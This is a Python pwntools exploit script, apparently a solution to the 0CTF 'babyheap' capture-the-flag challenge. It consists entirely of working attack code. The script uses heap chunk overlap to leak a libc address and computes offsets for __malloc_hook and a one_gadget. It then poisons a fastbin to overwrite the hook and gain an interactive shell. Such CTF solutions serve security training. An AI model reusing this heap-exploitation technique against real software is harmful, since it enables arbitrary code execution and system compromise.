#!/usr/bin/python
from pwn import *

context(arch = 'i386', os = 'linux')
context.log_level = 'debug'
local = True

e = ELF("./0ctfbabyheap")
if local :
  s = process("./0ctfbabyheap")
else :
  s = remote("pwnable.kr" , 9001)

lib = None
if local :
  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else :
  lib = ELF("./bf_libc.so")


#move p to putchar got


#gdb.attach(s)

log.info(s.recvuntil("Command:"))


def alloc(m) :
  s.sendline("1")
  s.recvuntil("Size:")
  s.sendline(str(m))
  s.recvuntil("Command:")

def shell() :
  s.sendline("1")
  s.recvuntil("Size:")
  s.sendline("8")

def free(m) :
  s.sendline("3")
  s.recvuntil("Index:")
  s.sendline(str(m))
  s.recvuntil("Command:")

def fill(i, size, m) :
  s.sendline("2")
  s.recvuntil("Index:")
  s.sendline(str(i))
  s.recvuntil("Size:")
  s.sendline(str(size))
  s.recvuntil("Content:")
  s.sendline(m)

def dump(i) :
  s.sendline("4")
  s.recvuntil("Index:")
  s.sendline(str(i))
  s.recvuntil("Content:")
  m = s.recv()
  return m

def exit(i) :
  s.sendline("5")

alloc(8) #0
alloc(8) #1
alloc(8) #2
alloc(8) #3
alloc(256) #4

free(2)
free(1)

d = 0

fill(0, 33, "a"*(16) + "\x00" * 8 + p64(0x21) + p8(0x80))
fill(3, 32, "b"*(16) + "\x00" * 8 + p64(0x21))

alloc(8) #1
alloc(8) #2 == #4

fill(3, 32 + d, "c"*(16 + d) + "\x00" * 8 + p64(0x111))

alloc(256) #5
free(4)
addr = dump(2)
log.info(hexdump(addr))
log.info( hexdump(addr[2:10]))
addr = u64(addr[2:10])
log.info(hex(addr))

mal_hook = addr - 0x68
log.info("mal_hook : " + hex(mal_hook))
chunk_addr = mal_hook - 0x23 # size aligned
log.info("chunk_addr : " + hex(chunk_addr))
libc_base = mal_hook - 0x3c3b10
log.info("libc_base : " + hex(libc_base))
one_gadget = libc_base + 0x4526a
log.info("one_gadget : " + hex(one_gadget))
alloc(104) #4
alloc(104) #6 => small bin 
alloc(104) #7
alloc(104) #8

free(8)
free(7)
fill(5, 0x100 + 0x8 * 3, "d"*0x100 + "\x00" * 8 + p64(0x7f) + p64(chunk_addr))

alloc(104) #7
alloc(104) #8

fill(8, 0x23 - 0x10 + 0x8, "e"*(0x23 - 0x10) + p64(one_gadget))

shell() # call one_gadget

s.interactive()

